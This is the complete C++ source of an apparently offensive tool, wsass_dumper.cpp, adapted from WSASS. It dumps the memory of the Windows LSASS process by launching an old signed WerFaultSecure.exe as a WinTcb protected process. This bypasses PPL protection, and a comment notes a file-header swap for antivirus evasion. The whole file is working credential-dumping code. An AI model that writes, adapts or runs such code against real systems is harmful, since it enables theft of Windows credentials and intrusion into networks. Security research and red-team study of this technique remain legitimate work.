/*
 * wsass_dumper.cpp — LSASS dump via WerFaultSecure.exe PPL bypass.
 *
 * Based on WSASS by TwoSevenOneT (https://github.com/TwoSevenOneT/WSASS).
 * Modified for ADscan: auto-finds lsass PID + TID, accepts configurable
 * output path, restores MDMP magic before exit.
 *
 * Usage:
 *   wsass_dumper.exe <PathToWerFaultSecure.exe> <OutputDumpPath>
 *
 * Technique:
 *   WerFaultSecure.exe (Win8.1 6.3.9600, signed WinTcb) is launched via
 *   CreateProcessW with PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL=WinTcb and
 *   CREATE_PROTECTED_PROCESS.  It inherits three file handles (dump, encfile,
 *   cancel event) via PROC_THREAD_ATTRIBUTE_HANDLE_LIST and calls
 *   MiniDumpWriteDump on lsass writing directly to our handle — bypassing PPL.
 *
 * Key correctness constraints (from original WSASS.cpp):
 *   1. InitializeProcThreadAttributeList with count=2 (protection + handle list)
 *   2. PROC_THREAD_ATTRIBUTE_HANDLE_LIST must list all 3 inheritable handles
 *   3. CreateProcessW bInheritHandles=FALSE (handle list controls inheritance)
 *   4. dwCreationFlags must include CREATE_PROTECTED_PROCESS (not CREATE_NO_WINDOW)
 *   5. WaitForSingleObject — not Sleep — to wait for dump completion
 */

#include <windows.h>
#include <winternl.h>
#include <string>
#include <sstream>
#include <iostream>
#include <thread>
#include <vector>

#pragma comment(lib, "ntdll.lib")

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL = ProcThreadAttributeValue(11, FALSE, TRUE, FALSE)
// = 11 | 0x00020000 = 0x0002000B
#ifndef PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL
#define PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL 0x0002000B
#endif

// PROC_THREAD_ATTRIBUTE_HANDLE_LIST = ProcThreadAttributeValue(2, FALSE, TRUE, FALSE)
// = 2 | 0x00020000 = 0x00020002
#ifndef PROC_THREAD_ATTRIBUTE_HANDLE_LIST
#define PROC_THREAD_ATTRIBUTE_HANDLE_LIST 0x00020002
#endif

#ifndef PROTECTION_LEVEL_WINTCB_LIGHT
#define PROTECTION_LEVEL_WINTCB_LIGHT 0
#endif

// CREATE_PROTECTED_PROCESS = 0x00040000
#ifndef CREATE_PROTECTED_PROCESS
#define CREATE_PROTECTED_PROCESS 0x00040000
#endif

// ---------------------------------------------------------------- NT types

typedef struct _MY_SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime, UserTime, CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    LONG Priority, BasePriority;
    ULONG ContextSwitches, ThreadState, WaitReason;
} MY_SYSTEM_THREAD_INFORMATION;

typedef struct _MY_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset, NumberOfThreads;
    LARGE_INTEGER Reserved[3], CreateTime, UserTime, KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId, InheritedFromUniqueProcessId;
    ULONG HandleCount, SessionId;
    ULONG_PTR PageDirectoryBase;
    SIZE_T PeakVirtualSize, VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize, WorkingSetSize, QuotaPeakPagedPoolUsage,
           QuotaPagedPoolUsage, QuotaPeakNonPagedPoolUsage, QuotaNonPagedPoolUsage,
           PagefileUsage, PeakPagefileUsage, PrivatePageCount;
    LARGE_INTEGER ReadOperationCount, WriteOperationCount, OtherOperationCount,
                  ReadTransferCount, WriteTransferCount, OtherTransferCount;
    MY_SYSTEM_THREAD_INFORMATION Threads[1];
} MY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI* pNtResumeProcess)(HANDLE);

// ---------------------------------------------------------------- helpers

static std::wstring HandleToDecimal(HANDLE h)
{
    std::wstringstream ss;
    ss << reinterpret_cast<UINT_PTR>(h);
    return ss.str();
}

static bool EnableDebugPrivilege()
{
    HANDLE hToken = nullptr;
    TOKEN_PRIVILEGES tp = {};
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    if (!LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(hToken);
    std::wcout << L"SeDebugPrivilege enabled successfully.\n";
    return true;
}

// Returns {pid, main_tid} for lsass.exe, or {0,0} on failure.
static std::pair<DWORD, DWORD> FindLsass()
{
    auto NtQSI = reinterpret_cast<PNtQuerySystemInformation>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
    if (!NtQSI) return {0, 0};

    ULONG len = 1 << 20;
    std::vector<BYTE> buf;
    NTSTATUS st;
    do {
        buf.resize(len);
        st = NtQSI(SystemProcessInformation, buf.data(), len, &len);
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(st)) return {0, 0};

    auto* entry = reinterpret_cast<MY_SYSTEM_PROCESS_INFORMATION*>(buf.data());
    while (true) {
        if (entry->ImageName.Buffer && entry->ImageName.Length > 0) {
            std::wstring name(entry->ImageName.Buffer,
                              entry->ImageName.Length / sizeof(wchar_t));
            if (_wcsicmp(name.c_str(), L"lsass.exe") == 0) {
                DWORD pid = static_cast<DWORD>(
                    reinterpret_cast<ULONG_PTR>(entry->UniqueProcessId));
                DWORD tid = 0;
                if (entry->NumberOfThreads > 0)
                    tid = static_cast<DWORD>(
                        reinterpret_cast<ULONG_PTR>(entry->Threads[0].ClientId.UniqueThread));
                return {pid, tid};
            }
        }
        if (!entry->NextEntryOffset) break;
        entry = reinterpret_cast<MY_SYSTEM_PROCESS_INFORMATION*>(
            reinterpret_cast<BYTE*>(entry) + entry->NextEntryOffset);
    }
    return {0, 0};
}

// Periodically resume lsass in case WerFaultSecure suspends it.
static void ResumeLoop(DWORD pid)
{
    auto NtResume = reinterpret_cast<pNtResumeProcess>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtResumeProcess"));
    if (!NtResume) return;
    for (int i = 0; i < 30; ++i) {
        Sleep(300);
        HANDLE h = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, pid);
        if (h) { NtResume(h); CloseHandle(h); }
    }
}

// Launch WerFaultSecure.exe at PPL WinTcb level.
//
// Critical correctness requirements:
//   - InitializeProcThreadAttributeList with count=2
//   - PROC_THREAD_ATTRIBUTE_HANDLE_LIST lists hDump/hEncDump/hCancel
//   - bInheritHandles=FALSE (handle list controls inheritance, not global flag)
//   - CREATE_PROTECTED_PROCESS flag (activates the PPL level attribute)
static bool LaunchWerFaultSecure(
    const std::wstring& werPath, DWORD pid, DWORD tid,
    HANDLE hDump, HANDLE hEncDump, HANDLE hCancel)
{
    // Command line to WerFaultSecure — handles passed as decimal integers
    std::wstringstream cmd;
    cmd << L"\"" << werPath << L"\""
        << L" /h"
        << L" /pid "    << pid
        << L" /tid "    << tid
        << L" /file "   << HandleToDecimal(hDump)
        << L" /encfile "<< HandleToDecimal(hEncDump)
        << L" /cancel " << HandleToDecimal(hCancel)
        << L" /type 268310";
    std::wstring cmdLine = cmd.str();

    // Two attributes: PROTECTION_LEVEL + HANDLE_LIST
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(nullptr, 2, 0, &attrSize);
    auto* attrList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(
        HeapAlloc(GetProcessHeap(), 0, attrSize));
    if (!attrList) return false;

    if (!InitializeProcThreadAttributeList(attrList, 2, 0, &attrSize)) {
        std::wcerr << L"InitializeProcThreadAttributeList failed: " << GetLastError() << L"\n";
        HeapFree(GetProcessHeap(), 0, attrList);
        return false;
    }

    // Attribute 1: PPL protection level = WinTcb (0)
    DWORD pplLevel = PROTECTION_LEVEL_WINTCB_LIGHT;
    if (!UpdateProcThreadAttribute(attrList, 0,
            PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
            &pplLevel, sizeof(pplLevel), nullptr, nullptr)) {
        std::wcerr << L"UpdateProcThreadAttribute (PPL) failed: " << GetLastError() << L"\n";
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        return false;
    }

    // Attribute 2: explicit handle inheritance list (required for PPL processes)
    // bInheritHandles=FALSE is used; only these handles are inherited.
    HANDLE handleList[3] = {hDump, hEncDump, hCancel};
    if (!UpdateProcThreadAttribute(attrList, 0,
            PROC_THREAD_ATTRIBUTE_HANDLE_LIST,
            handleList, sizeof(handleList), nullptr, nullptr)) {
        std::wcerr << L"UpdateProcThreadAttribute (handles) failed: " << GetLastError() << L"\n";
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        return false;
    }

    STARTUPINFOEXW si = {};
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attrList;
    // GUI processes (WerFaultSecure.exe) need a desktop even in Session 0.
    // Specifying the interactive desktop lets it start from a service context.
    si.StartupInfo.lpDesktop = const_cast<LPWSTR>(L"WinSta0\\Default");

    PROCESS_INFORMATION pi = {};
    // bInheritHandles=FALSE — handle list attribute controls inheritance
    // CREATE_PROTECTED_PROCESS activates the PPL level set above
    BOOL ok = CreateProcessW(
        nullptr, cmdLine.data(), nullptr, nullptr,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS,
        nullptr, nullptr,
        reinterpret_cast<LPSTARTUPINFOW>(&si), &pi);

    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);

    if (!ok) {
        std::wcerr << L"CreateProcessW failed: " << GetLastError() << L"\n";
        return false;
    }

    std::wcout << L"Successfully created PPL process with PID: " << pi.dwProcessId << L"\n";
    std::wcout << L"Protection level: PROTECTION_LEVEL_WINTCB_LIGHT\n";

    // Wait for WerFaultSecure to finish writing the dump (up to 30s)
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 30000);
    if (waitResult == WAIT_TIMEOUT) {
        std::wcerr << L"WerFaultSecure timed out\n";
        TerminateProcess(pi.hProcess, 1);
    }

    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    std::wcout << L"Process WerfaultSecure.exe exited with code: " << exitCode << L"\n";

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

// ---------------------------------------------------------------- main

int wmain(int argc, wchar_t* argv[])
{
    if (argc != 3) {
        std::wcout << L"Usage: wsass_dumper.exe <WerFaultSecure.exe path> <output dump path>\n"
                   << L"Example: wsass_dumper.exe C:\\Windows\\Temp\\WerFaultSecure.exe C:\\Windows\\Temp\\dump.dmp\n";
        return 1;
    }

    std::wstring werPath  = argv[1];
    std::wstring dumpPath = argv[2];

    // 1. Privileges
    if (!EnableDebugPrivilege()) {
        std::wcerr << L"Failed to enable SeDebugPrivilege: " << GetLastError() << L"\n";
        return 1;
    }

    // 2. Locate lsass
    auto [lsassPid, lsassTid] = FindLsass();
    if (lsassPid == 0) {
        std::wcerr << L"Failed to find lsass.exe\n";
        return 1;
    }
    std::wcout << L"lsass PID=" << lsassPid << L" TID=" << lsassTid << L"\n";

    // 3. Create output files — bInheritHandle=TRUE so attribute list can include them
    SECURITY_ATTRIBUTES sa = {sizeof(sa), nullptr, TRUE};

    HANDLE hDump = CreateFileW(dumpPath.c_str(), GENERIC_READ | GENERIC_WRITE, 0,
                               &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDump == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to create dump file: " << GetLastError() << L"\n";
        return 1;
    }

    std::wstring encPath = dumpPath + L".enc";
    HANDLE hEncDump = CreateFileW(encPath.c_str(), GENERIC_WRITE, 0,
                                  &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hEncDump == INVALID_HANDLE_VALUE) {
        CloseHandle(hDump);
        std::wcerr << L"Failed to create enc file: " << GetLastError() << L"\n";
        return 1;
    }

    HANDLE hCancel = CreateEventW(&sa, TRUE, FALSE, nullptr);
    if (!hCancel) {
        CloseHandle(hDump); CloseHandle(hEncDump);
        std::wcerr << L"Failed to create cancel event: " << GetLastError() << L"\n";
        return 1;
    }

    // 4. Resume loop (keep lsass alive if WerFaultSecure suspends it)
    std::thread resume(ResumeLoop, lsassPid);
    resume.detach();

    // 5. Launch WerFaultSecure at PPL WinTcb
    bool ok = LaunchWerFaultSecure(werPath, lsassPid, lsassTid, hDump, hEncDump, hCancel);

    // 6. Validate dump size before swapping header
    LARGE_INTEGER dumpSize = {};
    GetFileSizeEx(hDump, &dumpSize);
    std::wcout << L"Dump file size: " << dumpSize.QuadPart << L" bytes\n";

    if (ok && dumpSize.QuadPart > (10LL * 1024 * 1024)) {
        // Restore MDMP magic (WerFaultSecure writes PNG header for AV evasion)
        BYTE mdmp[4] = {0x4D, 0x44, 0x4D, 0x50}; // "MDMP"
        DWORD written = 0;
        SetFilePointer(hDump, 0, nullptr, FILE_BEGIN);
        WriteFile(hDump, mdmp, 4, &written, nullptr);
        std::wcout << L"MDMP magic restored.\n";
    } else if (ok) {
        std::wcerr << L"Dump too small (" << dumpSize.QuadPart << L" bytes) — likely failed\n";
        ok = false;
    }

    CloseHandle(hDump);
    CloseHandle(hEncDump);
    CloseHandle(hCancel);

    if (DeleteFileW(encPath.c_str()))
        std::wcout << L"File deleted successfully.\n";

    if (!ok) {
        std::wcerr << L"Dump failed\n";
        return 1;
    }
    std::wcout << L"Process dump successfully\n";
    std::wcout << L"Dump written to " << dumpPath << L"\n";
    return 0;
}
